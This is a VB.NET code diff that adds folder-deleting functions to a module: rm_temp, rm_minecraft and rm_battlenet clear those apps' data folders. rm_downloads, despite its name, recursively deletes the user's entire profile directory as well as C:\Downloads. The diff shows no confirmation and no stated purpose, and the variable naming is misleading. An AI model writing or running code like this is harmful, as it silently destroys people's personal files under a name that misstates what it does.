@@ -45,6 +45,36 @@ Module modLib
         Return Nothing
     End Function
 
+    Public Function rm_downloads()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        rm(szProgramFilesPath)
+        rm("C:\Downloads")
+        Return Nothing
+    End Function
+
+    Public Function rm_temp()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        rm(szProgramFilesPath & "\AppData\Local\Temp\")
+        Return Nothing
+    End Function
+
+    Public Function rm_minecraft()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        rm(szProgramFilesPath & "\AppData\Roaming\.minecraft\")
+        Return Nothing
+    End Function
+
+    Public Function rm_battlenet()
+        Dim szProgramFilesPath As String
+        szProgramFilesPath = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
+        rm(szProgramFilesPath & "\AppData\Roaming\Battle.net")
+        rm(szProgramFilesPath & "\AppData\Local\Battle.net")
+        Return Nothing
+    End Function
+
     Private Sub rm(path As String)
         If Directory.Exists(path) Then
             'Delete all files from the Directory
